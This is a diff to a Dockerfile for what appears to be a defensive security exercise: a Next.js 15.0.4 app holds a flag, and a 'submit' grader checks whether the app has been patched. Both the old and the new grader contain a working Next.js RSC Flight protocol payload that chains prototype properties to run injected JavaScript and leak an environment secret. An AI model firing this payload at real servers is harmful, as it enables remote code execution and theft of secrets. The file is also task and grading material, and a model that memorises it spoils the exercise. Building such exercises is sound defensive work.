@@ -1,3 +1,4 @@
+# syntax=docker/dockerfile:1
 FROM ubuntu:24.04
 
 # Set environment variables
@@ -11,7 +12,7 @@ RUN apt-get update \
     && yes | unminimize
 
 RUN apt-get update && apt-get upgrade -y && \
-    apt-get install -y openssh-server apt-file apt-utils iproute2 iputils-ping sudo htop iputils* acl tzdata net-tools vim nano acl curl git tini
+    apt-get install -y openssh-server apt-file apt-utils iproute2 iputils-ping sudo htop iputils* acl tzdata net-tools vim nano acl curl git tini tmux
 
 RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
     && apt-get install -y nodejs
@@ -49,79 +50,48 @@ RUN npx create-next-app@15.0.4 app \
 
 WORKDIR /home/secspace/app
 
-RUN printf "/** @type {import('next').NextConfig} */\nconst nextConfig = { output: 'standalone' };\nmodule.exports = nextConfig;\n" > next.config.js
-
 RUN npm install
-
-ENV NODE_ENV=production
-
-RUN npm run build
-
-# Prepare standalone directory
-RUN mkdir -p .next/standalone/public && \
-    mkdir -p .next/standalone/.next && \
-    cp -r public/* .next/standalone/public/ || true && \
-    cp -r .next/static .next/standalone/.next/static || true
 
 # Store the secret in a file to avoid the Docker ENV security warning
 RUN echo "cve{nextjs-flight-protocol-issue-defended}" > .rng_secret
 
 USER root
 
-# Create submission tool
-RUN printf '#!/usr/bin/env node\n\
-const fs = require("fs");\n\
-const secret = fs.readFileSync("/home/secspace/app/.rng_secret", "utf8").trim();\n\
-const payload = JSON.stringify({\n\
-  then: "$1:__proto__:then",\n\
-  status: "resolved_model",\n\
-  reason: -1,\n\
-  value: JSON.stringify({then: "$B1337"}),\n\
-  _response: {\n\
-    _prefix: `var res=process.env.RNG_SECRET;throw Object.assign(new Error(\"x\"),{digest: res});`,\n\
-    _chunks: "$Q2",\n\
-    _formData: { get: "$1:constructor:constructor" }\n\
-  }\n\
-});\n\
-\n\
-const boundary = "----WebKitFormBoundarysubmission";\n\
-const body = [\n\
-  `--${boundary}`,\n\
-  "Content-Disposition: form-data; name=\\"0\\"",\n\
-  "",\n\
-  payload,\n\
-  `--${boundary}`,\n\
-  "Content-Disposition: form-data; name=\\"1\\\"",\n\
-  "",\n\
-  "\\\"$@0\\\"",\n\
-  `--${boundary}`,\n\
-  "Content-Disposition: form-data; name=\\"2\\\"",\n\
-  "",\n\
-  "[]",\n\
-  `--${boundary}--`,\n\
-  ""\n\
-].join("\\r\\n");\n\
-\n\
-fetch("http://localhost:3000/adfa", {\n\
-  method: "POST",\n\
-  headers: {\n\
-    "Next-Action": "x",\n\
-    "Content-Type": `multipart/form-data; boundary=${boundary}`\n\
-  },\n\
-  body\n\
-}).then(res => res.text()).then(text => {\n\
-  if (text.includes(secret)) {\n\
-    console.log("\\x1b[31mIncorrect\\x1b[0m");\n\
-  } else {\n\
-    console.log("\\x1b[32mCorrect\\x1b[0m");\n\
-  }\n\
-}).catch(e => {\n\
-  console.log("\\x1b[32mCorrect\\x1b[0m");\n\
-});\n\
-' > /usr/local/bin/submit && chmod +x /usr/local/bin/submit
+# Switch to bash shell so heredoc works reliably
+SHELL ["/bin/bash", "-c"]
+
+# Create the submission tool inline
+RUN cat > /usr/local/bin/submit <<'SCRIPT'
+#!/bin/bash
+# Get the secret from the protected file
+SECRET=$(cat /home/secspace/app/.rng_secret 2>/dev/null)
+
+# Payload for the Next.js RSC Flight Protocol RCE attack
+PAYLOAD='{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.env.RNG_SECRET;throw Object.assign(new Error(\"x\"),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
+
+# Send the attack request
+RESULT=$(curl -s -X POST "http://localhost:3000/adfa" \
+  -H "Next-Action: x" \
+  -F "0=$PAYLOAD" \
+  -F '1="$@0"' \
+  -F '2=[]')
+
+# Check if the secret was successfully leaked in the result
+if echo "$RESULT" | grep -q "$SECRET"; then
+  echo -ne "\e[31mIncorrect\e[0m\n"
+else
+  echo -ne "\e[32mCorrect\e[0m\n"
+fi
+SCRIPT
+
+RUN chmod +x /usr/local/bin/submit
+
+# Switch back to default shell
+SHELL ["/bin/sh", "-c"]
 
 EXPOSE 22 3000
 
 ENTRYPOINT ["/usr/bin/tini", "--"]
 
-CMD ["/bin/bash", "-c", "/usr/sbin/sshd && su - secspace -c 'export RNG_SECRET=$(cat /home/secspace/app/.rng_secret) && cd /home/secspace/app/.next/standalone && PORT=3000 HOSTNAME=0.0.0.0 node server.js'"]
+# Start SSH and the Next.js dev server inside a tmux session
+CMD ["/bin/bash", "-c", "/usr/sbin/sshd && su - secspace -c 'tmux new-session -d -s nextjs \"export RNG_SECRET=$(cat /home/secspace/app/.rng_secret) && cd /home/secspace/app && npm run dev\"' && tail -f /dev/null"]
